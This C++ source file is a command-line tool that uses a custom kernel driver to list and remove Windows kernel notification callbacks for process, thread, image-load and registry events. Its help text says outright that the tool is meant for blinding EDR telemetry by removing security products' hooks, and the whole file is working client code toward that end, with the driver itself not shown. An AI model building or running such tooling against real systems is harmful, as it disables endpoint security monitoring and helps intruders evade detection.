#include <print>
#include <memory>
#include <optional>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Enumerate and remove kernel notification callbacks.

Description:
  Lists or removes registered kernel notification callbacks for
  process creation, thread creation, or image load events. This is
  useful for blinding EDR kernel telemetry by removing their hooks.

Usage:
  {0} <type>                             Enumerate callbacks
  {0} <type> --remove-all                Remove all callbacks of type
  {0} <type> --remove-index <index>      Remove single callback by index
  {0} --help                             Show this help

Arguments:
  type            Callback type: process, thread, image, or registry
  --remove-all    Remove all callbacks of the given type
  --remove-index  Remove a single callback at the given array index

Examples:
  {0} process                     List all process creation callbacks
  {0} thread --remove-all          Remove all thread callbacks
  {0} image --remove-index 3       Remove image callback at index 3
)", prog );
}

static std::optional< ULONG > parse_type( std::string_view s )
{
	if( s == "process" )  return CALLBACK_TYPE_PROCESS;
	if( s == "thread" )   return CALLBACK_TYPE_THREAD;
	if( s == "image" )    return CALLBACK_TYPE_IMAGE;
	if( s == "registry" ) return CALLBACK_TYPE_REGISTRY;
	return std::nullopt;
}

static std::string_view type_name( ULONG t )
{
	switch( t )
	{
	case CALLBACK_TYPE_PROCESS:  return "process";
	case CALLBACK_TYPE_THREAD:   return "thread";
	case CALLBACK_TYPE_IMAGE:    return "image";
	case CALLBACK_TYPE_REGISTRY: return "registry";
	default: return "unknown";
	}
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 && ( std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" ) ) ? 0 : 1;
	}

	const auto cb_type = parse_type( argv[1] );

	if( !cb_type )
	{
		std::println( "[!] Unknown callback type '{}'. Use: process, thread, image, or registry.", argv[1] );
		return 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	// Check for --remove-all or --remove-index
	bool remove_all = false;
	bool remove_single = false;
	ULONG remove_index = 0;

	for( int i = 2; i < argc; i++ )
	{
		const auto arg = std::string_view{ argv[i] };

		if( arg == "--remove-all" )
			remove_all = true;
		else if( arg == "--remove-index" && i + 1 < argc )
		{
			remove_single = true;
			remove_index = static_cast< ULONG >( std::stoul( argv[++i] ) );
		}
	}

	if( remove_single )
	{
		if( driver->remove_callback( *cb_type, remove_index ) )
			std::println( "[+] Removed {} callback at index {}.", type_name( *cb_type ), remove_index );
		else
		{
			std::println( "[!] Failed to remove callback at index {}.", remove_index );
			return 1;
		}
	}
	else if( remove_all )
	{
		if( auto removed = driver->remove_all_callbacks( *cb_type ) )
			std::println( "[+] Removed {} {} callbacks.", *removed, type_name( *cb_type ) );
		else
		{
			std::println( "[!] Failed to remove {} callbacks.", type_name( *cb_type ) );
			return 1;
		}
	}
	else
	{
		if( auto callbacks = driver->enum_callbacks( *cb_type ) )
		{
			std::println( "[+] Found {} {} callbacks:", callbacks->size(), type_name( *cb_type ) );

			for( const auto& cb : *callbacks )
				std::println( "    [{}] 0x{:X}", cb.index, cb.address );
		}
		else
		{
			std::println( "[!] Failed to enumerate {} callbacks.", type_name( *cb_type ) );
			return 1;
		}
	}

	return 0;
}
